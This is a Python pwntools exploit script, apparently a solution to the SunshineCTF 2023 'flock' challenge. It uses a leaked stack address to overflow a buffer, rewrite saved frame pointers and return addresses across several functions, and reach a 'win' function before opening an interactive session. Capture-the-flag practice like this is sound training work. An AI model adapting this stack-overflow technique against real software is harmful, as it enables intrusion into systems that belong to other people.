#!/usr/bin/env python3

from pwn import *
from ast import literal_eval
import time

exe = "./flock"
elf = ELF("./flock")

context.binary = elf
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "DEBUG"
# b *func5+104
gdbscript = """
b *func5+104
b *func4+28
b *func3+28
b *func2+28
continue
"""

if args.REMOTE:
    p = remote("chal.2023.sunshinectf.games", 23002)

elif args.DEBUG:
    p = gdb.debug([exe], gdbscript=gdbscript)
elif args.RUN:
    p = process([exe])
else:
    p = process([exe])
    gdb.attach(p, gdbscript=gdbscript)


def main():
    winAddr = 0x4011b9
    canary = 0x401276
    func4 = 0x4012a0

    p.recvuntil(b"<<< Song Begins At")
    songHex = p.recvline().strip().decode()
    leakedStack = int(songHex, 0)

    rbp4 = leakedStack + 0x80 

    info(f"Leaked Stack Address: {leakedStack:#0x}")
    info(f"Using RBP: {rbp4:#0x}")

    info(f"RBP for fun5: {rbp4+0x10+0x8:#0x}")
    info(f"RBP for func4: {rbp4+0x18+0x8:#0x}")

    buffer = b"A"*64 + b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaa"
    buffer += p64(rbp4+0x10+0x8) # reset rbp for 5
    buffer += p64(0x401276) # func 5
    buffer += b"BBBBBBBB" # func 4
    buffer += p64(rbp4+0x20+0x8) # reset rbp for 4
    buffer += p64(0x4012a0) # func3
    buffer += p64(rbp4+0x30+0x8) # reset rbp for 3
    buffer += p64(0x4012ca) # func2
    buffer += p64(rbp4+0x40+0x8) # func2
    buffer += p64(0x4012f0) # reset rbp for 2
    buffer += p64(elf.symbols['win']) + p64(elf.symbols['win'])

    p.recvuntil(b"PwnMe >>> ")

    p.send(buffer)
    p.interactive()


if __name__ == "__main__":
    main()
